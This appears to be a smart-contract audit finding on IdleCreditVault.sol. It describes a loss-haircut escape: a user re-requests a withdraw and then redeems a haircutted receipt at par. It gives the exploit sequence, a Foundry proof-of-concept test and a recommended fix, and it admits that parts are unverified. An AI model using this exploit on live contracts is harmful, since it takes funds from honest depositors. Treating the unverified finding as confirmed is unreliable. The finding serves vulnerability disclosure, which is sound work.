### Title
Re-requesting a withdraw after a loss-adjusted epoch orphans the haircut receipt and lets the user claim the full un-haircutted basis at par - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The BendDAO finding is a state-transition bug: repaying 100% of the debt zeroes `scaledAmount` but never clears `loanStatus`/`LockerAddr`, so the collateral stays locked until the user takes an unnatural follow-up action (borrowing again). The closest analog in idle-tranches is the inverse-but-equivalent bookkeeping gap around `lastWithdrawRequest`: `IdleCreditVault.requestWithdraw` unconditionally overwrites `lastWithdrawRequest[_user]`, and `_claimLossAdjustedWithdrawRequest` locates a user's haircutted receipt only via `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`. A user whose receipt was haircutted by a `stopEpochWithDuration` loss can re-request a withdraw in the loss epoch; this orphans the per-epoch loss basis, and the old basis remains inside the aggregate `withdrawsRequests[_user]`, which `_claimFundedWithdrawRequest` later pays at par (1:1) — escaping the loss entirely.

### Finding Description
When a stop ends with a loss, `collectWithdrawFunds` stores `lossRecoveryPriceByEpoch[epochNumber] = _amount * RECOVERY_FULL / pendingBasis` and zeroes `pendingWithdraws` [1](#0-0) . Affected users are expected to claim only through `_claimLossAdjustedWithdrawRequest`, which looks up the haircut epoch via `lossEpoch = lastWithdrawRequest[_user]` and pays `claimBasis * lossRecoveryPrice / RECOVERY_FULL` [2](#0-1) . The per-epoch basis `withdrawsRequestsByEpoch[_user][lossEpoch]` is only cleared by `_clearWithdrawClaimForEpoch` inside that path or the defaulted-epoch path.

`requestWithdraw` sets `lastWithdrawRequest[_user] = currentEpoch` and adds `_amount` to both `withdrawsRequests[_user]` and `withdrawsRequestsByEpoch[_user][currentEpoch]` with no check that a previous receipt was claimed [3](#0-2) . The code comments even acknowledge re-requesting is permitted ("If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait for another epoch") [4](#0-3) .

Sequence (buffer phase after a lossy `stopEpochWithDuration`):

1. User requests withdraw in epoch N; `lastWithdrawRequest[user] = N`, `withdrawsRequestsByEpoch[user][N] = X`, `withdrawsRequests[user] = X`.
2. `stopEpochWithDuration` realizes a loss; `collectWithdrawFunds` is called with `_amount < pendingBasis`, storing `lossRecoveryPriceByEpoch[N] < RECOVERY_FULL`. Epoch bumps to N+1.
3. Instead of claiming at the haircut, user calls `requestWithdraw` again (e.g., for 1 wei of tranche or another tranche). Now `lastWithdrawRequest[user] = N+1` and `withdrawsRequests[user] = X + dust`.
4. On the next `claimWithdrawRequest`, `_claimLossAdjustedWithdrawRequest` computes `lossEpoch = lastWithdrawRequest[user] = N+1`, finds `lossRecoveryPriceByEpoch[N+1] == 0`, and returns 0 [5](#0-4) . The haircutted basis `withdrawsRequestsByEpoch[user][N]` is never cleared or priced.
5. `_claimFundedWithdrawRequest` then burns `withdrawsRequests[user]` — which still contains the full pre-haircut `X` — and pays it 1:1 via `_transferFundedClaim` [6](#0-5) .

Broken invariant: fair burn/loss waterfall — realized losses on pending receipts must be socialized pro rata, but the receipt escapes its haircut and is redeemed at par from the strategy's funded reserve, leaving less underlying for honest claimants (insolvency at the tail, mirroring the PoC-donation test's reserve mechanics [7](#0-6) ).

### Impact Explanation
Direct theft/insolvency: the attacker recovers `X` instead of `X * lossRecoveryPrice / RECOVERY_FULL`. The excess `X * (1 - lossRecoveryPrice/RECOVERY_FULL)` is paid from underlying collected to fund haircutted receipts, so honest pending claimants or active LPs absorb the attacker's share of the loss. With a 50% loss price and a large receipt, the attacker doubles their recovery relative to entitled value.

### Likelihood Explanation
Requires a `stopEpochWithDuration` loss (honest manager/borrower action) and the attacker holding a pending receipt that epoch — a normal, unprivileged state. The exploit is two ordinary user calls (`requestWithdraw`, then `claimWithdrawRequest` one epoch later). No privileged role is involved; the only precondition is that the user has tranche tokens to submit the second request, which any holder does. Caveat: I could not fully verify `_clearWithdrawClaimForEpoch`'s internals or whether `requestWithdraw` has an additional guard above line 271; if it decrements the aggregate only per-epoch, the orphaning stands, but if `requestWithdraw` reverts on unclaimed receipts the attack fails. The documented NOTE suggesting re-requests are permitted supports the attack path.

### Recommendation
In `requestWithdraw`, either (a) revert if `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]] != 0` and the loss receipt is unclaimed, forcing settlement at the haircut first; or (b) settle any existing loss-adjusted/defaulted receipt inline before recording the new request. Alternatively, track loss-epoch bases separately from `withdrawsRequests[_user]` so `_claimFundedWithdrawRequest` cannot pay a haircutted basis at par. As defense-in-depth, iterate all per-epoch bases in `claimWithdrawRequest` rather than keying solely on `lastWithdrawRequest`.

### Proof of Concept
```solidity
function test_LossReceiptEscapeByReRequest() external {
  uint256 amountWei = 10_000 * ONE_SCALE;
  uint256 mintedAA = idleCDO.depositAA(amountWei);
  address honest = makeAddr('honest');
  _depositWithUser(honest, amountWei, true);

  // epoch 0 running
  _startEpochAndCheckPrices(0);
  _stopEpochAndCheckPrices(0, initialProvidedApr, _expectedFundsEndEpoch());

  // both request full withdraws in buffer of epoch 1
  cdoEpoch.requestWithdraw(mintedAA, address(AAtranche));
  vm.prank(honest);
  cdoEpoch.requestWithdraw(0, address(AAtranche));

  // epoch 1 ends with a partial loss: borrower funds only half of pendingWithdraws
  _startEpochAndCheckPrices(1);
  uint256 pending = strategy.pendingWithdraws();
  vm.warp(cdoEpoch.epochEndDate() + 1);
  // fund borrower for interest + only half of pending receipts
  uint256 shortfall = pending / 2;
  // stopEpochWithDuration path -> collectWithdrawFunds(half) -> lossRecoveryPriceByEpoch[1] = 0.5e18
  _stopEpochWithLoss(0, shortfall); // helper: warp, deal borrower funds minus shortfall, manager calls stopEpochWithDuration

  assertGt(strategy.lossRecoveryPriceByEpoch(1), 0, 'loss epoch recorded');
  assertLt(strategy.lossRecoveryPriceByEpoch(1), strategy.RECOVERY_FULL(), 'haircut applied');

  // attacker does NOT claim; instead re-requests a tiny withdraw in epoch 2 buffer
  uint256 dust = 1;
  deal(address(AAtranche), address(this), dust); // or request from remaining balance
  cdoEpoch.requestWithdraw(dust, address(AAtranche));
  // lastWithdrawRequest[this] is now 2 -> loss epoch 1 lookup orphaned

  // run epoch 2 normally
  _startEpochAndCheckPrices(2);
  _stopEpochAndCheckPrices(2, initialProvidedApr, _expectedFundsEndEpoch());

  uint256 balPre = underlying.balanceOf(address(this));
  cdoEpoch.claimWithdrawRequest();
  uint256 got = underlying.balanceOf(address(this)) - balPre;

  uint256 entitled = (mintedAA * strategy.lossRecoveryPriceByEpoch(1) / strategy.RECOVERY_FULL()) + dust;
  // attacker received the un-haircutted basis: got ~= mintedAA + dust > entitled
  assertGt(got, entitled, 'loss haircut escaped via re-request');
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L281-294)
```text
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L323-325)
```text
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L338-349)
```text
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L411-430)
```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L789-800)
```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
```

**File:** test/foundry/IdleCreditVault.t.sol (L5859-5910)
```text
  function testPocWithdrawDos() external {
    // We check if donating assets to the pool causes the last withdrawer to be unable to withdraw
    // due to not minting strategyTokens on donations. Sherlock audit finding
    address alice = vm.addr(0x1);
    address bob = vm.addr(0x2);
    address _strategyToken = cdoEpoch.strategy();

    uint256 initialAlice = 10000e6;
    uint256 initialBob = 1000e6;
    deal(defaultUnderlying, alice, initialAlice);
    deal(defaultUnderlying, bob, initialBob);
    // to pay for interest
    deal(defaultUnderlying, borrower, 200000e6);

    // Alice deposit 9000 USDC.
    vm.startPrank(alice);
    IERC20Detailed(defaultUnderlying).approve(address(idleCDO), type(uint256).max);
    idleCDO.depositAA(9000e6);
    vm.stopPrank();

    // Bob deposit 1000 USDC
    vm.startPrank(bob);
    IERC20Detailed(defaultUnderlying).approve(address(idleCDO), type(uint256).max);
    idleCDO.depositAA(1000e6);
    vm.stopPrank();

    // start epoch
    _toggleEpoch(true, 0, 0);

    // close pool
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.startPrank(manager);
    cdoEpoch.stopEpoch(0, 1);
    vm.stopPrank();

    vm.startPrank(alice);
    // donate 1000 USDC to the contract
    IERC20Detailed(defaultUnderlying).transfer(address(cdoEpoch), 1000e6);
    // request withdraw for the max amount before the tx reverts
    cdoEpoch.requestWithdraw(0, cdoEpoch.AATranche());
    cdoEpoch.claimWithdrawRequest();
    uint256 afterBalance = IERC20Detailed(defaultUnderlying).balanceOf(alice);
    vm.stopPrank();

    // Alice will lose money because she donated assets
    assertLt(afterBalance, initialAlice, 'Alice balance increased');
    
    // request withdraw for all and claim right away given that pool is closed
    vm.startPrank(bob);
    cdoEpoch.requestWithdraw(0, cdoEpoch.AATranche());
    cdoEpoch.claimWithdrawRequest();
    afterBalance = IERC20Detailed(defaultUnderlying).balanceOf(bob);
```
